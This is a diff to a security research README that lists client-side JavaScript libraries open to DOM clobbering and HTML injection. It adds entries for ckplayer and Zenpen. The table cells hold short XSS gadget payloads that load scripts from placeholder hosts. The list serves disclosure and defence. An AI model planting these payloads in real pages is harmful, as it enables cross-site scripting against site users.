@@ -26,6 +26,7 @@ This repository lists client-side libraries that are vulnerable to HTML injectio
 | [steal](./domc-gadgets/steal.md) | 1.4K | v2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>``` | XSS | TheHulk | Mitre | N/A |
 | [UMeditor](./domc-gadgets/umeditor.md) | 1.4K | v1.2.2 | ```<a id="UMEDITOR_HOME_URL" href="https://xxx.xxx.xxx/"></a>``` | XSS | TheHulk | Reported | N/A |
 | [squirt](./domc-gadgets/squirt.md) | 1.2K | v0.0.1 | ```<img name="scripts" src="http://xxx.xxx.xxx"><img name="scripts" src="http://xxx.xxx.xxx">``` | XSS | TheHulk | Reported | N/A |
+| [ckplayer](./domc-gadgets/ckplayer.md) | 1.1K | latest | ```<img name="scripts" src="https://xxx.xxx.xxx/js/"><img name="scripts" src="https://xxx.xxx.xxx/js/">``` | XSS | TheHulk | N/A | N/A |
 | [polyfills](./domc-gadgets/polyfills.md) | 1.1K | v2.8.0 | ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | Reported | N/A |
 | [doomcaptcha](./domc-gadgets/doomcaptcha.md) | 1K | latest | ```<img name="currentScript" label="<script>alert(1)</script>"></img>``` | XSS | TheHulk | Mitre | N/A |
 | [AddToAny](./domc-gadgets/addtoany.md) | N/A | N/A | ```<img src="https://addtoany.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Patched | N/A |
@@ -45,5 +46,6 @@ The following libraries accept user input and output content as `type/html` with
 | [simplemde](./html-injection/simplemde.md) | 9.9K | v1.11.2 | Type | N/A | Any named property | N/A | N/A |
 | [vditor](./html-injection/vditor.md) | 8.3K | v3.10.6 | Type | N/A | Any named property | N/A | N/A |
 | [Froala](./html-injection/froala.md) | 5.3K | v4.2.2 | Copy&Paste | DOMPurify | Any `name` attributes | N/A | N/A |
+| [Zenpen](./html-injection/zenpen.md) | 3.8K | latest | Copy&Paste | N/A | Any named attributes | N/A | N/A |
 | [SunEditor](./html-injection/sun-editor.md) | 1.7K | v2.47.0 | Copy&Paste | N/A | `a` tag with `id` | N/A | N/A |
 | [RichTextEditor](./html-injection/richtexteditor.md) | N/A | Latest | Copy&Paste | N/A | Any named property | N/A | N/A |
